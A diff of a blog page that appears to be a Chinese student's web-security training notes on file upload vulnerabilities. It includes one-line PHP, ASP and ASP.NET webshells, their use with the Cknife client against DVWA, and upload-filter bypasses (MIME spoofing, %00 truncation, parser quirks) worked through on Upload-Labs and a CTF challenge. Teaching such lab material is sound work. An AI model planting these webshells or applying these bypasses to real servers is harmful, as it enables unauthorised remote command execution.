@@ -11,13 +11,13 @@
   
   
   
-  <meta name="description" content="今天学姐主要讲了文件上传漏洞，了解了Cknife等工具的使用。">
+  <meta name="description" content="今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。">
 <meta name="keywords" content="ctf,web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WEB入门（三）">
 <meta property="og:url" content="https://qianfei11.github.io/2018/07/06/WEB入门（三）/index.html">
 <meta property="og:site_name" content="AssassinQ">
-<meta property="og:description" content="今天学姐主要讲了文件上传漏洞，了解了Cknife等工具的使用。">
+<meta property="og:description" content="今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://qianfei11.github.io/pics/WEB集训/三/1.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/WEB集训/三/2.png">
@@ -28,10 +28,10 @@
 <meta property="og:image" content="https://qianfei11.github.io/pics/WEB集训/三/7.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/WEB集训/三/8.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/WEB集训/三/9.png">
-<meta property="og:updated_time" content="2019-05-12T15:46:29.000Z">
+<meta property="og:updated_time" content="2019-08-26T05:49:07.865Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB入门（三）">
-<meta name="twitter:description" content="今天学姐主要讲了文件上传漏洞，了解了Cknife等工具的使用。">
+<meta name="twitter:description" content="今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。">
 <meta name="twitter:image" content="https://qianfei11.github.io/pics/WEB集训/三/1.png">
   
     <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
@@ -162,27 +162,27 @@
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>今天学姐主要讲了文件上传漏洞，了解了Cknife等工具的使用。</p>
+        <p>今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。</p>
 <a id="more"></a>
 <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>上传的文件不进行限制，有可能会被利用于上传可执行文件、脚本到服务器上，并且通过脚本文件可以获得执行服务器端命令的能力</p>
-<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>根据语言分类，有PHP、ASP、JSP、ASP.NET等不同语言下的木马；根据作用分类，有大马和小马。</p>
-<p>PHP一句话木马：</p>
+<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>根据语言分类，有 PHP、ASP、JSP、ASP.NET 等不同语言下的木马；根据作用分类，有大马和小马。</p>
+<p>PHP 一句话木马：</p>
 <ul>
 <li><code>&lt;?php ehco shell_exec($_GET[&#39;a&#39;]); ?&gt;</code></li>
 <li><code>&lt;?php ehco shell_exec($_POST[&#39;a&#39;]); ?&gt;</code></li>
 <li><code>&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;</code></li>
 </ul>
-<p>ASP一句话木马：</p>
+<p>ASP 一句话木马：</p>
 <ul>
 <li><code>&lt;%eval request(&quot;Cknife&quot;)%&gt;</code></li>
 </ul>
-<p>ASP.NET一句话木马：</p>
+<p>ASP.NET 一句话木马：</p>
 <ul>
 <li><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;Cknife&quot;],&quot;unsafe&quot;);%&gt;</code></li>
 </ul>
 <h2 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h2><ol>
 <li>shell_exec(): 通过环境执行命令，并且将完整的输出以字符串的方式返回。</li>
-<li>eval(): 把字符串作为PHP代码执行执行a接收到的内容。</li>
+<li>eval(): 把字符串作为 PHP 代码执行执行 a 接收到的内容。</li>
 </ol>
 <h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h2><table>
 <thead>
@@ -202,7 +202,7 @@
 </tr>
 <tr>
 <td style="text-align:center">函数种类</td>
-<td style="text-align:center">PHP系统功能</td>
+<td style="text-align:center">PHP 系统功能</td>
 </tr>
 </tbody>
 </table>
@@ -210,27 +210,27 @@
 <ol>
 <li>绝对路径（_SERVER[“script_FILENAME”]）</li>
 </ol>
-<p>找到phpinfo()可以直接找到网站的绝对路径。</p>
+<p>找到 phpinfo()可以直接找到网站的绝对路径。</p>
 <ol start="2">
 <li>支持的程序</li>
 </ol>
-<p>可以查看一些特殊的程序服务，诸如redis、memcache、mysql、SMTP、curl。要是服务器装了redis或者memcache，就可以通过ssrf来getshell。</p>
+<p>可以查看一些特殊的程序服务，诸如 redis、memcache、mysql、SMTP、curl。要是服务器装了 redis 或者 memcache，就可以通过 ssrf 来 getshell。</p>
 <ol start="3">
-<li>泄漏真实ip（_SERVER[“SERVER_ADDR”]或者SERVER_ADDR）</li>
+<li>泄漏真实 ip（_SERVER[“SERVER_ADDR”]或者 SERVER_ADDR）</li>
 </ol>
-<p>得到的ip可以直接用来查旁站和c段。</p>
+<p>得到的 ip 可以直接用来查旁站和 c 段。</p>
 <ol start="4">
 <li>GOPHER</li>
 </ol>
-<p>如果支持gopher也能直接用ssrf。</p>
+<p>如果支持 gopher 也能直接用 ssrf。</p>
 <ol start="5">
 <li>fastcgi</li>
 </ol>
-<p>查看是否开启fastcgi和查看fastcgi的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。</p>
+<p>查看是否开启 fastcgi 和查看 fastcgi 的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。</p>
 <ol start="6">
 <li>泄漏缓存文件地址（_FILES[“file1”]）</li>
 </ol>
-<p>向phpinfo()post一个shell后，可以在”_FILE[“file1”]”中看到上传的临时文件，如果有个LFI，便可以直接getshell。</p>
+<p>向 phpinfo()post 一个 shell 后，可以在”_FILE[“file1”]”中看到上传的临时文件，如果有个 LFI，便可以直接 getshell。</p>
 <ol start="7">
 <li>一些敏感配置</li>
 </ol>
@@ -241,24 +241,24 @@
 <li>open_basedir：读取一些没权限的目录</li>
 </ul>
 </blockquote>
-<p>还能获取一些环境信息，如environment中的path、log等。</p>
-<h2 id="Linux基本命令"><a href="#Linux基本命令" class="headerlink" title="Linux基本命令"></a>Linux基本命令</h2><ul>
+<p>还能获取一些环境信息，如 environment 中的 path、log 等。</p>
+<h2 id="Linux-基本命令"><a href="#Linux-基本命令" class="headerlink" title="Linux 基本命令"></a>Linux 基本命令</h2><ul>
 <li>ls：列出当前目录下所有文件</li>
 <li>pwd：查看文件当前目录</li>
 </ul>
 <h1 id="Cknife（菜刀）"><a href="#Cknife（菜刀）" class="headerlink" title="Cknife（菜刀）"></a>Cknife（菜刀）</h1><p>超级强大的网站管理工，分为客户端和代码两部分</p>
 <p>只要将那简短的一句话代码放到网站上去就可以取得网站的权限</p>
-<p>运行环境：安装了JRE1.7+环境的所有操作系统</p>
+<p>运行环境：安装了 JRE1.7+环境的所有操作系统</p>
 <p>主要功能：文件管理、虚拟终端、数据库管理</p>
-<h2 id="DVWA之File-Upload"><a href="#DVWA之File-Upload" class="headerlink" title="DVWA之File Upload"></a>DVWA之File Upload</h2><p>low level的测试一下，源码中没有对任何文件格式进行过滤：</p>
+<h2 id="DVWA-之-File-Upload"><a href="#DVWA-之-File-Upload" class="headerlink" title="DVWA 之 File Upload"></a>DVWA 之 File Upload</h2><p>low level 的测试一下，源码中没有对任何文件格式进行过滤：</p>
 <ol>
 <li>写出一句话木马</li>
 </ol>
 <p>用菜刀连接的一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>直接在网页下通过GET的一句话木马：</p>
+<p>直接在网页下通过 GET 的一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> shell_exec($_GET[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在网页下用hackbar通过POST的一句话木马：</p>
+<p>在网页下用 hackbar 通过 POST 的一句话木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> shell_exec($_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <ol start="2">
 <li>上传一句话木马直接在网页查到文件</li>
@@ -266,85 +266,85 @@
 <p><img src="/pics/WEB集训/三/1.png" alt="GET"></p>
 <p><img src="/pics/WEB集训/三/2.png" alt="POST"></p>
 <ol start="3">
-<li>Cknife连接</li>
+<li>Cknife 连接</li>
 </ol>
 <p><img src="/pics/WEB集训/三/3.png" alt="连接后可以得到目标服务器下所有文件"></p>
 <p>源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'Upload'</span>])) &#123;</span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>;</span><br><span class="line">            <span class="comment">//上传路径为../../hackable/uploads/</span></span><br><span class="line">            $target_path = $target_path . basename( $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);</span><br><span class="line">            <span class="comment">//上传路径加上上传的文件名</span></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;</span><br><span class="line">            <span class="comment">//对是否上传成功做出判断，因此所有格式的文件都能上传</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">                <span class="keyword">echo</span> $target_path . <span class="string">' succesfully uploaded!'</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h1 id="文件上传漏洞检测"><a href="#文件上传漏洞检测" class="headerlink" title="文件上传漏洞检测"></a>文件上传漏洞检测</h1><ul>
-<li>客户端javascript检测：通常在本地检测文件的扩展名</li>
-<li>服务端MIME类型检测：通常检测的是Content-Type内容</li>
-<li>服务端目录路径检测：通常根path参数相关的内容</li>
-<li>服务端文件扩展名检测：通常检测跟文件extension相关的内容</li>
+<li>客户端 javascript 检测：通常在本地检测文件的扩展名</li>
+<li>服务端 MIME 类型检测：通常检测的是 Content-Type 内容</li>
+<li>服务端目录路径检测：通常根 path 参数相关的内容</li>
+<li>服务端文件扩展名检测：通常检测跟文件 extension 相关的内容</li>
 <li>服务端文件内容检测：检测文件内容是否合法或含有恶意代码</li>
 </ul>
-<h2 id="客户端javascript检测"><a href="#客户端javascript检测" class="headerlink" title="客户端javascript检测"></a>客户端javascript检测</h2><p>在客户端使用js对不合法图片进行检查</p>
+<h2 id="客户端-javascript-检测"><a href="#客户端-javascript-检测" class="headerlink" title="客户端 javascript 检测"></a>客户端 javascript 检测</h2><p>在客户端使用 js 对不合法图片进行检查</p>
 <p>绕过：</p>
 <ul>
-<li>禁用页面js</li>
+<li>禁用页面 js</li>
 <li>先把文件改成符合条件的文件格式上传，在抓包，修改文件的后缀名</li>
 </ul>
-<h2 id="服务端检测绕过（MIME类型检测）"><a href="#服务端检测绕过（MIME类型检测）" class="headerlink" title="服务端检测绕过（MIME类型检测）"></a>服务端检测绕过（MIME类型检测）</h2><p>通过判断<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]!=&quot;imgae/gif&quot;</code>来保证上传的文件类型为gif</p>
-<p>绕过：通过burp抓包，将原来的Content-Type类型改为符合要求的类型</p>
+<h2 id="服务端检测绕过（MIME-类型检测）"><a href="#服务端检测绕过（MIME-类型检测）" class="headerlink" title="服务端检测绕过（MIME 类型检测）"></a>服务端检测绕过（MIME 类型检测）</h2><p>通过判断<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]!=&quot;imgae/gif&quot;</code>来保证上传的文件类型为 gif</p>
+<p>绕过：通过 burp 抓包，将原来的 Content-Type 类型改为符合要求的类型</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/octet-stream</span><br></pre></td></tr></table></figure>
-<p><code>application/octet-stream</code>即为php文件的文件类型格式</p>
+<p><code>application/octet-stream</code>即为 php 文件的文件类型格式</p>
 <h2 id="服务端目录路径检测"><a href="#服务端目录路径检测" class="headerlink" title="服务端目录路径检测"></a>服务端目录路径检测</h2><p>上传路径为<code>/image/20160704</code>时，可以通过修改为<code>image/20160704/eval.php%00filename.gif</code></p>
-<p>通过%00截断最终导致存储的文件名为<code>eval.php</code></p>
+<p>通过%00 截断最终导致存储的文件名为<code>eval.php</code></p>
 <h2 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h2><p>分为黑名单检测和白名单检测</p>
 <h3 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="黑名单检测"></a>黑名单检测</h3><p>接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传</p>
 <p>绕过：</p>
 <ul>
-<li>后缀名大小写绕过，例如：将Burpsuite截获的数据包中的文件名<code>evil.php</code>改<code>evil.php</code></li>
-<li>名单列表绕过，尝试使用非黑名单内的后缀名，如php5，php7等</li>
-<li>特殊文件名绕过（只适用windows，将文件名改为<code>evil.php.</code>或<code>evil.php</code>（注意这里有一个空格)。在windows下，不允许这样的命名，所以会将.和空格自动去掉）。</li>
-<li>0x00截断绕过：在上传的时候，当文件系统读到0x00时，会认为文件已经结束。例如：<code>1.php%00.jpg</code>，验证扩展名是<code>.jpg</code>，但写入的时候是<code>1.php</code>文件</li>
+<li>后缀名大小写绕过，例如：将 Burpsuite 截获的数据包中的文件名<code>evil.php</code>改<code>evil.php</code></li>
+<li>名单列表绕过，尝试使用非黑名单内的后缀名，如 php5，php7 等</li>
+<li>特殊文件名绕过（只适用 windows，将文件名改为<code>evil.php.</code>或<code>evil.php</code>（注意这里有一个空格)。在 windows 下，不允许这样的命名，所以会将.和空格自动去掉）。</li>
+<li>0x00 截断绕过：在上传的时候，当文件系统读到 0x00 时，会认为文件已经结束。例如：<code>1.php%00.jpg</code>，验证扩展名是<code>.jpg</code>，但写入的时候是<code>1.php</code>文件</li>
 </ul>
 <h3 id="白名单检测"><a href="#白名单检测" class="headerlink" title="白名单检测"></a>白名单检测</h3><p>接收上传的文件做扩展名匹配，匹配上的白名单中的扩展名的文件才能上传</p>
 <p>绕过：</p>
 <ul>
-<li>0x00阶段绕过</li>
+<li>0x00 阶段绕过</li>
 <li>解析漏洞绕过<ul>
-<li>（1）apache解析文件名是从右到左识别扩展名，如<code>eval.php.jpg</code>，文件为php文件，不能解析jpg会向前解析php</li>
-<li>（2）IIS6.0目录名包含<code>.asp、.asa、.cer</code>的话，则该目录下的所有文件都将按照asp解析。</li>
-<li>（3）IIS6.0不解析;后面的，所以提交<code>evil.asp;.html</code>解析为asp类型</li>
-<li>（4）Nginx解析漏洞：将php文件换成其他可以通过的文件后缀，访问的时候在后面加上<code>eval.php.jpg</code>，如<code>evil.jpg/.php</code>，<code>evil.jpg</code>会解析为php的格式</li>
+<li>（1）apache 解析文件名是从右到左识别扩展名，如<code>eval.php.jpg</code>，文件为 php 文件，不能解析 jpg 会向前解析 php</li>
+<li>（2）IIS6.0 目录名包含<code>.asp、.asa、.cer</code>的话，则该目录下的所有文件都将按照 asp 解析。</li>
+<li>（3）IIS6.0 不解析;后面的，所以提交<code>evil.asp;.html</code>解析为 asp 类型</li>
+<li>（4）Nginx 解析漏洞：将 php 文件换成其他可以通过的文件后缀，访问的时候在后面加上<code>eval.php.jpg</code>，如<code>evil.jpg/.php</code>，<code>evil.jpg</code>会解析为 php 的格式</li>
 </ul>
 </li>
 </ul>
 <h2 id="服务端文件内容检测"><a href="#服务端文件内容检测" class="headerlink" title="服务端文件内容检测"></a>服务端文件内容检测</h2><ul>
 <li>图像类文件内容检测</li>
 <li>文件幻数检测（图片头格式检测）<ul>
-<li>jpg内容头value = <code>FF D8 FF E0 00 10 4A 46 49 46</code></li>
-<li>gif内容头value = <code>47 49 46 38 39 61</code></li>
-<li>png内容头value = <code>89 50 4E 47</code></li>
+<li>jpg 内容头 value = <code>FF D8 FF E0 00 10 4A 46 49 46</code></li>
+<li>gif 内容头 value = <code>47 49 46 38 39 61</code></li>
+<li>png 内容头 value = <code>89 50 4E 47</code></li>
 </ul>
 </li>
 </ul>
 <p>绕过：在文件头后加上一句话木马就能绕过</p>
-<h1 id="Upload-Labs"><a href="#Upload-Labs" class="headerlink" title="Upload-Labs"></a>Upload-Labs</h1><p>分别对客户端javascript检测、服务端MIME类型检测、服务端目录路径检测三种不同类型的绕过进行练习。</p>
-<p>这里有个坑。经过潘大佬的测试，上传文件超过了文件大小php.ini中即系统设定的大小。php.ini中的配置原本为<code>upload_max_filesize = 2M</code>，修改为<code>upload_max_filesize = 20M</code>。然后就可以上传文件了。</p>
+<h1 id="Upload-Labs"><a href="#Upload-Labs" class="headerlink" title="Upload-Labs"></a>Upload-Labs</h1><p>分别对客户端 javascript 检测、服务端 MIME 类型检测、服务端目录路径检测三种不同类型的绕过进行练习。</p>
+<p>这里有个坑。经过潘大佬的测试，上传文件超过了文件大小 php.ini 中即系统设定的大小。php.ini 中的配置原本为<code>upload_max_filesize = 2M</code>，修改为<code>upload_max_filesize = 20M</code>。然后就可以上传文件了。</p>
 <h2 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h2><p>源码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以知道此处的过滤是通过javascript实现的，在开发者工具中禁用js就可以上传木马</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">"upload_file"</span>)[<span class="number">0</span>].value;</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">    alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">  <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">  <span class="comment">//提取上传文件的类型</span></span><br><span class="line">  <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">  <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">  <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> errMsg =</span><br><span class="line">      <span class="string">"该文件不允许上传，请上传"</span> +</span><br><span class="line">      allow_ext +</span><br><span class="line">      <span class="string">"类型的文件,当前文件类型为："</span> +</span><br><span class="line">      ext_name;</span><br><span class="line">    alert(errMsg);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以知道此处的过滤是通过 javascript 实现的，在开发者工具中禁用 js 就可以上传木马</p>
 <p><img src="/pics/WEB集训/三/4.png" alt="打开开发者工具禁用js"></p>
 <h2 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h2><p>源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里对文件MIME类型进行了限制，只需要用burpsuite抓包后，将<code>Content-Type</code>修改为<code>image/jpeg</code>或<code>image/gif</code>或<code>image/png</code>，放包后上传成功</p>
+<p>这里对文件 MIME 类型进行了限制，只需要用 burpsuite 抓包后，将<code>Content-Type</code>修改为<code>image/jpeg</code>或<code>image/gif</code>或<code>image/png</code>，放包后上传成功</p>
 <p><img src="/pics/WEB集训/三/5.png" alt="修改完后放包"></p>
 <h2 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h2><p>源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里由于有jpg、png、gif的白名单，需要想办法绕过。然后在接收到文件后还会对文件修改名字并最后存为相应格式的文件。故这里先将上传的文件修改为白名单中的格式，再把文件最后存储的位置通过%00对后面的后缀名截断</p>
+<p>这里由于有 jpg、png、gif 的白名单，需要想办法绕过。然后在接收到文件后还会对文件修改名字并最后存为相应格式的文件。故这里先将上传的文件修改为白名单中的格式，再把文件最后存储的位置通过%00 对后面的后缀名截断</p>
 <p><img src="/pics/WEB集训/三/6.png" alt="修改完成后发送显示上传成功"></p>
 <h1 id="实验吧之上传绕过"><a href="#实验吧之上传绕过" class="headerlink" title="实验吧之上传绕过"></a>实验吧之上传绕过</h1><p>bypass the upload<br>格式：flag{}<br><a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">解题链接</a></p>
-<h2 id="0x00截断上传"><a href="#0x00截断上传" class="headerlink" title="0x00截断上传"></a>0x00截断上传</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">path=<span class="string">"upfiles/picture/"</span></span><br><span class="line">file=<span class="string">"20180321.jpg"</span></span><br><span class="line">upfilename=path &amp; file <span class="string">'最后的上传地址</span></span><br><span class="line"><span class="string">%&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>upfilename</code>即为最终名字，意思为如果地址为<code>picture/1.php+</code>，文件名为<code>1.jpg</code>则最终上传上去的文件路径为<code>picture/1.php+1.jpg</code>。0x00截断的思路即为将+之后的内容忽略掉使上传文件<code>1.jpg</code>最终上传到<code>1.php</code>中。</p>
-<p>先随便上传一个图片文件，提示需要上传php文件。同样上传php文件，提示需要上传其他格式文件。</p>
